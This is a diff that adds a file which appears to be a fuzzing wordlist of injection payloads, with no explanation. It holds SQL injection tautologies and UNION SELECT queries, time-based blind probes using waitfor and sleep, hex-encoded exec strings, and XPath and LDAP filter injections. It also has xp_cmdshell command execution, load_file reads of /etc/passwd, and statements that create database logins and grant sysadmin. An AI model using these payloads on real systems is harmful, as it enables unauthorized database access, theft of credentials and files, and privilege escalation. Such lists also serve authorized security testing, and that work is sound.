@@ -1,0 +1,227 @@
+﻿
+10
+10-1
+9
+'
+' and 1=1
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+and 1bi = 1bd
+and FUNCTION('1=1 and','2')='2'
+and SQL('1=1')
+and "1"='1'
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+'
+a' or 1=1--
+"a"" or 1=1--"
+ or a = a
+a' or 'a' = 'a
+1 or 1=1
+a' waitfor delay '0:0:10'--
+1 waitfor delay '0:0:10'--
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+a'
+?
+' or 1=1
+ý or 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'
+'%20or%20''='
+'%20or%20'x'='x
+%20or%20x=x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+) or (a=a
+hi or a=a
+hi or 1=1 --"
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+"hi"") or (""a""=""a"
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+<>"'%;)(&+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+%df
+%df%27
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+a' or 3=3--
+"a"" or 3=3--"
+' or 3=3
+ý or 3=3 --
+'=0#
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1-- 
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+ @var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CREATE USER name IDENTIFIED BY 'pass123'
+CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; 
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) 
+ + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*
+if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*
+if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*
+if(now()=sysdate() xor 1=1,SLEEP(5),0)
+if(now()=sysdate() xor 1=2,SLEEP(5),0)
